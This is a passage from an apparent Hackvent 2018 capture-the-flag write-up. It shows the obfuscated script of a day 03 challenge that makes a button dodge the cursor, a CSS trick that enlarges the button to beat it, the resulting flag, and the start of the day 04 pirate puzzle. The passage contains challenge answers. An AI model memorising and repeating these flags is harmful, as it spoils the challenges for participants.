class="s2">x6B</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x79</span><span class="se">\</span><span class="s2">x64</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x77</span><span class="se">\</span><span class="s2">x6E</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x6D</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x75</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x6E</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x72</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x70</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x67</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x58</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x70</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x67</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x59</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x64</span><span class="se">\</span><span class="s2">x64</span><span class="se">\</span><span class="s2">x45</span><span class="se">\</span><span class="s2">x76</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x6E</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x4C</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x6E</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x72</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x6D</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x75</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x6D</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x76</span><span class="se">\</span><span class="s2">x65</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x6D</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x75</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x76</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x72</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x72</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x6E</span><span class="se">\</span><span class="s2">x64</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x6D</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x63</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x6C</span><span class="se">\</span><span class="s2">x65</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x6D</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x64</span><span class="se">\</span><span class="s2">x64</span><span class="se">\</span><span class="s2">x6C</span><span class="se">\</span><span class="s2">x65</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x64</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x70</span><span class="se">\</span><span class="s2">x6C</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x79</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x6E</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x6E</span><span class="se">\</span><span class="s2">x65</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x63</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x73</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x68</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x64</span><span class="se">\</span><span class="s2">x65</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x6C</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x66</span><span class="se">\</span><span class="s2">x74</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x70</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x62</span><span class="se">\</span><span class="s2">x6C</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x63</span><span class="se">\</span><span class="s2">x6B</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x68</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x77</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="se">\</span><span class="s2">x72</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x64</span><span class="se">\</span><span class="s2">x79</span><span class="dl">"</span><span class="p">];</span>
<span class="nf">$</span><span class="p">(</span><span class="nb">document</span><span class="p">)[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">29</span><span class="p">]](</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="nf">$</span><span class="p">(</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">3</span><span class="p">])[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">2</span><span class="p">]](</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">_0xaa99x6</span> <span class="o">&lt;</span> <span class="nx">_0xaa99x4</span> <span class="o">&amp;&amp;</span> <span class="nx">_0xaa99x4</span> <span class="o">&lt;</span> <span class="p">(</span><span class="nx">_0xaa99x6</span> <span class="o">+</span> <span class="nx">_0xaa99x8</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">_0xaa99x7</span> <span class="o">&lt;</span> <span class="nx">_0xaa99x5</span> <span class="o">&amp;&amp;</span> <span class="nx">_0xaa99x5</span> <span class="o">&lt;</span> <span class="p">(</span><span class="nx">_0xaa99x7</span> <span class="o">+</span> <span class="nx">_0xaa99x9</span><span class="p">))</span> <span class="p">{</span>
            <span class="nf">alert</span><span class="p">(</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nf">alert</span><span class="p">(</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
        <span class="p">}</span>
    <span class="p">});</span>
    <span class="nf">$</span><span class="p">(</span><span class="nb">window</span><span class="p">)[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">8</span><span class="p">]](</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">if </span><span class="p">(</span><span class="nf">$</span><span class="p">(</span><span class="nb">window</span><span class="p">)[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">4</span><span class="p">]]()</span> <span class="o">&lt;</span> <span class="mi">500</span> <span class="o">||</span> <span class="nf">$</span><span class="p">(</span><span class="nb">window</span><span class="p">)[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">5</span><span class="p">]]()</span> <span class="o">&lt;</span> <span class="mi">400</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if </span><span class="p">(</span><span class="nx">_0xaa99x2</span> <span class="o">==</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">_0xaa99x2</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
                <span class="nf">alert</span><span class="p">(</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
                <span class="nf">hideButton</span><span class="p">()</span>
            <span class="p">}</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">if </span><span class="p">(</span><span class="nx">_0xaa99x2</span> <span class="o">=</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{}</span>
        <span class="p">};</span>
        <span class="nx">_0xaa99xa</span> <span class="o">=</span> <span class="nf">$</span><span class="p">(</span><span class="nb">window</span><span class="p">)[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">4</span><span class="p">]]()</span> <span class="o">-</span> <span class="nf">$</span><span class="p">(</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">3</span><span class="p">])[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">6</span><span class="p">]]();</span>
        <span class="nx">_0xaa99xb</span> <span class="o">=</span> <span class="nf">$</span><span class="p">(</span><span class="nb">window</span><span class="p">)[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">5</span><span class="p">]]()</span> <span class="o">-</span> <span class="nf">$</span><span class="p">(</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">3</span><span class="p">])[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">7</span><span class="p">]]()</span>
    <span class="p">});</span>
    <span class="nf">$</span><span class="p">(</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">3</span><span class="p">])[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">11</span><span class="p">]](</span><span class="kd">function</span><span class="p">(</span><span class="nx">_0xaa99x1</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">_0xaa99x1</span><span class="p">[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">9</span><span class="p">]]</span> <span class="o">==</span> <span class="mi">13</span> <span class="o">||</span> <span class="nx">_0xaa99x1</span><span class="p">[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">9</span><span class="p">]]</span> <span class="o">==</span> <span class="mi">32</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">_0xaa99x1</span><span class="p">[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">10</span><span class="p">]]();</span>
            <span class="nf">alert</span><span class="p">(</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="p">}</span>
    <span class="p">});</span>
    <span class="kd">var</span> <span class="nx">_0xaa99x2</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
    <span class="kd">var</span> <span class="nx">_0xaa99x3</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
    <span class="kd">var</span> <span class="nx">_0xaa99x4</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kd">var</span> <span class="nx">_0xaa99x5</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kd">var</span> <span class="nx">_0xaa99x6</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kd">var</span> <span class="nx">_0xaa99x7</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kd">var</span> <span class="nx">_0xaa99x8</span> <span class="o">=</span> <span class="nf">$</span><span class="p">(</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">3</span><span class="p">])[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">6</span><span class="p">]]();</span>
    <span class="kd">var</span> <span class="nx">_0xaa99x9</span> <span class="o">=</span> <span class="nf">$</span><span class="p">(</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">3</span><span class="p">])[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">7</span><span class="p">]]();</span>
    <span class="nb">document</span><span class="p">[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">15</span><span class="p">]](</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">12</span><span class="p">],</span> <span class="kd">function</span><span class="p">(</span><span class="nx">_0xaa99x1</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">_0xaa99x4</span> <span class="o">=</span> <span class="nx">_0xaa99x1</span><span class="p">[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">13</span><span class="p">]];</span>
        <span class="nx">_0xaa99x5</span> <span class="o">=</span> <span class="nx">_0xaa99x1</span><span class="p">[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">14</span><span class="p">]]</span>
    <span class="p">},</span> <span class="kc">false</span><span class="p">);</span>
    <span class="nf">$</span><span class="p">(</span><span class="nb">window</span><span class="p">)[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">16</span><span class="p">]](</span><span class="kd">function</span><span class="p">(</span><span class="nx">_0xaa99x1</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">_0xaa99x4</span> <span class="o">=</span> <span class="nx">_0xaa99x1</span><span class="p">[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">13</span><span class="p">]];</span>
        <span class="nx">_0xaa99x5</span> <span class="o">=</span> <span class="nx">_0xaa99x1</span><span class="p">[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">14</span><span class="p">]];</span>
        <span class="k">if </span><span class="p">(</span><span class="nf">_0xaa99xc</span><span class="p">()</span> <span class="o">&amp;&amp;</span> <span class="nx">_0xaa99x3</span> <span class="o">==</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">_0xaa99x3</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
            <span class="nf">_0xaa99xe</span><span class="p">()</span>
        <span class="p">}</span>
    <span class="p">});</span>
    <span class="nf">$</span><span class="p">(</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">3</span><span class="p">])[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">17</span><span class="p">]](</span><span class="kd">function</span><span class="p">(</span><span class="nx">_0xaa99x1</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">_0xaa99x4</span> <span class="o">=</span> <span class="nx">_0xaa99x1</span><span class="p">[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">13</span><span class="p">]];</span>
        <span class="nx">_0xaa99x5</span> <span class="o">=</span> <span class="nx">_0xaa99x1</span><span class="p">[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">14</span><span class="p">]];</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">_0xaa99x3</span> <span class="o">==</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">_0xaa99x3</span> <span class="o">==</span> <span class="kc">true</span><span class="p">;</span>
            <span class="nf">_0xaa99xe</span><span class="p">()</span>
        <span class="p">}</span>
    <span class="p">});</span>
    <span class="kd">var</span> <span class="nx">_0xaa99xa</span> <span class="o">=</span> <span class="nf">$</span><span class="p">(</span><span class="nb">window</span><span class="p">)[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">4</span><span class="p">]]()</span> <span class="o">-</span> <span class="nf">$</span><span class="p">(</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">3</span><span class="p">])[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">6</span><span class="p">]]();</span>
    <span class="kd">var</span> <span class="nx">_0xaa99xb</span> <span class="o">=</span> <span class="nf">$</span><span class="p">(</span><span class="nb">window</span><span class="p">)[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">5</span><span class="p">]]()</span> <span class="o">-</span> <span class="nf">$</span><span class="p">(</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">3</span><span class="p">])[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">7</span><span class="p">]]();</span>
    <span class="nx">_0xaa99x6</span> <span class="o">=</span> <span class="nx">_0xaa99xa</span> <span class="o">/</span> <span class="mi">2</span> <span class="o">+</span> <span class="nb">Math</span><span class="p">[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">18</span><span class="p">]]()</span> <span class="o">*</span> <span class="nx">_0xaa99xa</span> <span class="o">/</span> <span class="mi">2</span><span class="p">;</span>
    <span class="nx">_0xaa99x7</span> <span class="o">=</span> <span class="nx">_0xaa99xb</span> <span class="o">/</span> <span class="mi">2</span> <span class="o">+</span> <span class="nb">Math</span><span class="p">[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">18</span><span class="p">]]()</span> <span class="o">*</span> <span class="nx">_0xaa99xb</span> <span class="o">/</span> <span class="mi">2</span><span class="p">;</span>
    <span class="nf">_0xaa99xe</span><span class="p">();</span>

    <span class="kd">function</span> <span class="nf">_0xaa99xc</span><span class="p">()</span> <span class="p">{</span>
        <span class="nx">lbx</span> <span class="o">=</span> <span class="nx">_0xaa99x6</span> <span class="o">+</span> <span class="nx">_0xaa99x8</span> <span class="o">/</span> <span class="mi">2</span><span class="p">;</span>
        <span class="nx">lby</span> <span class="o">=</span> <span class="nx">_0xaa99x7</span> <span class="o">+</span> <span class="nx">_0xaa99x9</span> <span class="o">/</span> <span class="mi">2</span><span class="p">;</span>
        <span class="k">if </span><span class="p">((</span><span class="nx">_0xaa99x4</span> <span class="o">-</span> <span class="nx">_0xaa99x6</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="nx">_0xaa99x4</span> <span class="o">-</span> <span class="nx">lbx</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="nx">_0xaa99x5</span> <span class="o">-</span> <span class="nx">lby</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="nx">_0xaa99x5</span> <span class="o">-</span> <span class="nx">lby</span><span class="p">)</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mi">200</span> <span class="o">*</span> <span class="mi">200</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">return</span> <span class="kc">true</span>
        <span class="p">};</span>
        <span class="k">return</span> <span class="kc">false</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">_0xaa99xd</span><span class="p">()</span> <span class="p">{</span>
        <span class="nx">_0xaa99x6</span> <span class="o">=</span> <span class="p">(</span><span class="nb">Math</span><span class="p">[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">18</span><span class="p">]]()</span> <span class="o">*</span> <span class="nx">_0xaa99xa</span><span class="p">)</span> <span class="o">%</span> <span class="nx">_0xaa99xa</span><span class="p">;</span>
        <span class="nx">_0xaa99x7</span> <span class="o">=</span> <span class="p">(</span><span class="nb">Math</span><span class="p">[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">18</span><span class="p">]]()</span> <span class="o">*</span> <span class="nx">_0xaa99xb</span><span class="p">)</span> <span class="o">%</span> <span class="nx">_0xaa99xb</span><span class="p">;</span>
        <span class="k">while </span><span class="p">(</span><span class="nf">_0xaa99xc</span><span class="p">())</span> <span class="p">{</span>
            <span class="nf">_0xaa99xd</span><span class="p">()</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">_0xaa99xe</span><span class="p">()</span> <span class="p">{</span>
        <span class="nf">$</span><span class="p">(</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">3</span><span class="p">])[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">24</span><span class="p">]](</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">19</span><span class="p">],</span> <span class="p">{</span>
            <span class="na">origin</span><span class="p">:</span> <span class="p">[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">20</span><span class="p">],</span> <span class="nx">_0x766f</span><span class="p">[</span><span class="mi">20</span><span class="p">]]</span>
        <span class="p">},</span> <span class="mi">100</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
            <span class="nf">$</span><span class="p">(</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">3</span><span class="p">])[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">23</span><span class="p">]](</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">21</span><span class="p">],</span> <span class="nx">_0x766f</span><span class="p">[</span><span class="mi">22</span><span class="p">]);</span>
            <span class="nf">_0xaa99xd</span><span class="p">();</span>
            <span class="nf">_0xaa99xf</span><span class="p">()</span>
        <span class="p">})</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">_0xaa99xf</span><span class="p">()</span> <span class="p">{</span>
        <span class="nf">$</span><span class="p">(</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">3</span><span class="p">])[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">23</span><span class="p">]](</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">25</span><span class="p">],</span> <span class="nx">_0xaa99x6</span><span class="p">);</span>
        <span class="nf">$</span><span class="p">(</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">3</span><span class="p">])[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">23</span><span class="p">]](</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">26</span><span class="p">],</span> <span class="nx">_0xaa99x7</span><span class="p">);</span>
        <span class="nf">$</span><span class="p">(</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">3</span><span class="p">])[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">28</span><span class="p">]](</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">19</span><span class="p">],</span> <span class="p">{</span>
            <span class="na">origin</span><span class="p">:</span> <span class="p">[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">20</span><span class="p">],</span> <span class="nx">_0x766f</span><span class="p">[</span><span class="mi">20</span><span class="p">]]</span>
        <span class="p">},</span> <span class="mi">100</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
            <span class="nf">$</span><span class="p">(</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">3</span><span class="p">])[</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">23</span><span class="p">]](</span><span class="nx">_0x766f</span><span class="p">[</span><span class="mi">21</span><span class="p">],</span> <span class="nx">_0x766f</span><span class="p">[</span><span class="mi">27</span><span class="p">]);</span>
            <span class="nx">_0xaa99x2</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
            <span class="nx">_0xaa99x3</span> <span class="o">=</span> <span class="kc">false</span>
        <span class="p">})</span>
    <span class="p">}</span>
<span class="p">});</span>
</pre></table></code></div></div><p>..but we cheesed this one a little bit by just changing the size of the button in CSS to always fill the screen and make it easy to click</p><div class="language-css highlighter-rouge"><div class="code-header"> <span data-label-text="CSS"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nf">#button</span> <span class="p">{</span>
	<span class="nl">width</span><span class="p">:</span> <span class="m">100%</span> <span class="cp">!important</span><span class="p">;</span>
	<span class="nl">height</span><span class="p">:</span> <span class="m">100%</span> <span class="cp">!important</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Now we can easily click the button and collect our flag:</p><p><img src="writeupfiles/day03-screenshot.png" alt="" /></p><h2> Flag</h2><code> HV18-pFAT-O1Dl-HjVp-jJNE-Zju8 </code><hr><h1 id="day-04-pirating-like-in-the-90ies"> Day 04: pirating like in the 90ies <a href="/CTF-writeups-public/writeups/Hackvent_2018/day-04-pirating-like-in-the-90ies.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><em>Ahoy, my name is Santa and I want to be a pirate!</em></p><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><a href="https://hackvent.hacking-lab.com/Pirates_123/">Go to the pirates</a></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>It is a website with 12 pirates with a text box beneath them that need to be filled with specific values to decrypt the key</p><p><img src="writeupfiles/day04-screenshot.png" alt="" /></p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre>[..]

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"divTableRow"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"divTableCell"</span> <span class="na">align=</span><span class="s">"center"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"pirate01.jpg"</span> <span class="na">width=</span><span class="s">"151"</span> <span class="na">height=</span><span class="s">"151"</span><span class="nt">&gt;</span>
	<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"year"</span><span class="nt">&gt;</span>Nebraska<span class="nt">&lt;/div&gt;</span>
	<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"number"</span><span class="nt">&gt;&lt;br&gt;&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">id=</span><span class="s">"pirate01"</span> <span class="na">size=</span><span class="s">"2"</span><span class="nt">&gt;&lt;/div&gt;</span>
  <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"divTableCell"</span><span class="nt">&gt;</span>
	<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"pirate02.jpg"</span> <span class="na">width=</span><span class="s">"151"</span> <span class="na">height=</span><span class="s">"151"</span><span class="nt">&gt;</span>
	<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"year"</span><span class="nt">&gt;</span>Tortuga<span class="nt">&lt;/div&gt;</span>
	<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"number"</span><span class="nt">&gt;&lt;br&gt;&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">id=</span><span class="s">"pirate02"</span> <span class="na">size=</span><span class="s">"2"</span><span class="nt">&gt;&lt;/div&gt;</span>
  <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"divTableCell"</span><span class="nt">&gt;</span>
	<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"pirate03.jpg"</span> <span class="na">width=</span><span class="s">"151"</span> <span class="na">height=</span><span class="s">"151"</span><span class="nt">&gt;</span>
	<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"year"</span><span class="nt">&gt;</span>Antigua<span class="nt">&lt;/div&gt;</span>
  		<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"number"</span><span class="nt">&gt;&lt;br&gt;&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">id=</span><span class="s">"pirate03"</span> <span class="na">size=</span><span class="s">"2"</span><span class="nt">&gt;&lt;/div&gt;</span>
  <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"divTableCell"</span><span class="nt">&gt;</span>
	<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"pirate04.jpg"</span> <span class="na">width=</span><span class="s">"151"</span> <span class="na">height=</span><span class="s">"151"</span><span class="nt">&gt;</span>
	<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"year"</span><span class="nt">&gt;</span>Jamaica<span class="nt">&lt;/div&gt;</span>
	<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"number"</span><span class="nt">&gt;&lt;br&gt;&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">id=</span><span class="s">"pirate04"</span> <span class="na">size=</span><span class="s">"2"</span><span class="nt">&gt;&lt;/div&gt;</span>
	<span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/div&gt;</span>

[..]
</pre></table></code></div></div><p>and a script to produce the flag:</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="kd">function</span> <span class="nf">JollyRoger</span><span class="p">()</span> <span class="p">{</span>

		<span class="kd">var</span> <span class="nx">elements</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByTagName</span><span class="p">(</span><span class="dl">"</span><span class="s2">input</span><span class="dl">"</span><span class="p">)</span>
		<span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">elements</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
